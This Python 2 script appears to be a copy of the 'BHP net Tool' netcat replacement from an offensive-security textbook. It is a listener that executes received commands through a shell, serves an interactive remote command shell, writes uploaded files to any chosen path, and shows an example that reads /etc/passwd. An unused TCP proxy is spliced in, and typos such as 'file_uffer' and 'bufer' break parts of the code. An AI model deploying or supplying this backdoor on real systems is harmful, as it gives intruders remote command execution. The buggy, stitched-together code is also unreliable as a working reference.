#!/usr/bin/env python
import sys
import socket
import getopt
import threading
import subprocess
import pdb

# define some global variables
listen              = False
command             = False
upload              = False
execute             = ""
target              = ""
upload_destination  = ""
port                = 0

def usage():
    print "BHP net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen              - listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run - execute the given file upon receiving a connection"
    print "-c --command             - initialize a command shell"
    print "-u --upload=destination  - upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=C:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
            # connetct to our target host
            client.connect((target, port))
            if len(buffer):
                    client.send(buffer)
                    while True:
                        #now wait for data back
                        recv_len = 1
                        response = ""
                        while recv_len:
                            data     = client.recv(4096)
                            recv_len = len(data)
                            response += data
                            if recv_len < 4096:
                                break
                        print response,

                        #wait for more input
                        buffer = raw_input("")
                        buffer += "\n"
                        # send it off
                        client.send(buffer)
    except:
            print "[*] Exception! Exiting."

            # tear down the connection
            client.close()

def server_loop():
    global target

    # if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        #spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):
    # trim the newline
    command = command.rstrip()

    # run the command and get the output back
    try:
            output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell = True)
    except:
            output = "Failed to execute command. \r\n"

    #send the output backk to the client
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    # check for upload
    if len(upload_destination):
        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        # now we take these bytes and try to write them out
        try:
                    file_descriptor = open(upload_destination, "wb")
                    file_descriptor.write(file_uffer)
                    file_descriptor.close()

                    # acknowledge that we wrote the file out
                    client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
                    client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # check for command execution
    if len(execute):
        # run the command
        output = run_command(execute)
        client_socket.send(output)

    # now we go into another loop if a command shell was requested
    if command:
        while True:
            # show a simple prompt
            client_socket.send("<BHP:#> ")
            # now we receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # send back the command output
            response = run_command(cmd_buffer)

            # send back the response
            client_socket.send(response)

def proxy_handler(client_socket, remote_host, remote_port, receive_first):

    # connect to the remote host
    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remote_socket.connect((remote_host, remote_port))

    # receive data from the remote end if necessary
    if receive_first:
        remote_buffer = receive_from(remote_socket)
        hexdump(remote_buffer)

        # send it to our response handler
        remote_buffer = response_handler(remote_buffer)

        # if we have data to send to our local client, send it
        if len(remote_buffer):
            print "[<==] Sending %d bytes to localhost." % len(remote_buffer)
            client_socket.send(remote_buffer)

        # now lets loop and read from local, send to remote, send to local
        # rinse, wash, repeat
        while True:
            # read from local host
            local_bufer = receive_from(client_socket)

            if len(local_buffer):
                print "[==>] Received %d bytes from localhost." % len(local_buffer)
                hexdump(local_buffer)

                # send it to our request handler
                local_buffer = request_handler(local_buffer)

                # send off the datato the remote host
                remote_socket.send(local_buffer)
                print "[==>] sent to remote."

            # receive back the response
            remote_buffer = receive_from(remote_socket)

            if len(remote_buffer):
                print "[<==] Received %d bytes from remote." % len(remote_buffer)
                hexdump(remote_buffer)

                # send to our response handler
                remote_buffer = response_handler(remote_buffer)

                # send the response to the local socket
                client_socket.send(remote_buffer)

                print "[<==] Sent to localhost."

            # if no more data on either side, clone the connections
            if not len(local_buffer) or not len(remote_buffer):
                client_socket.close()
                remote_socket.close()
                print "[*] No more data. Closing connections."

                break

# this is a pretty hex dumping function directly taken from
# the comments here:
# http://code.activestate.com/recipes/142812-hex-dumper/
def hexdump(src, length=16):
    result = []
    digits = 4 if isinstance(src, unicode) else 2
    for i in xrange(0, len(src), length):
        s = src[i:i+length]
        hexa = b' '.join(["%0*X" % (digits, ord(x)) for x in s])
        text = b''.join([x if 0x20 <= ord(x) < 0x7F else b'.' for x in s])
        result.append(b"%04X %-*s %s" % (i, length*(digits + 1), hexa, text))

    print b'\n'.join(result)

def receive_from(connection):
    buffer = ""
    # We set a 2 second timeout; depending on your
    # target, this may need to be adjusted
    connection.settimeout(2)
    try:
            # keep reading into the buffer until
            # there's no more data
            # or we time out
            while True:
                data = connection.recv(4096)
                if not data:
                    break

                buffer += data
    except:
        pass

    return buffer

# modify any requests destined for the remote host
def request_handler(buffer):
    # perform packet modifications
    return bufer

# modify any responses destined for the local host
def response_handler(buffer):
    # perform packet modifications
    return bufer

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:
        # read in the buffer from the commandline
        # this will block, so send CTRL-D if not sending input
        # to stdin
        buffer = sys.stdin.read()

        #pdb.set_trace()
        # send data off
        client_sender(buffer)

    # we are going to listen and potentially
    # upload things, execute commands, and drop a shell back
    # depending on our command line options above
    if listen:
        server_loop()

main()

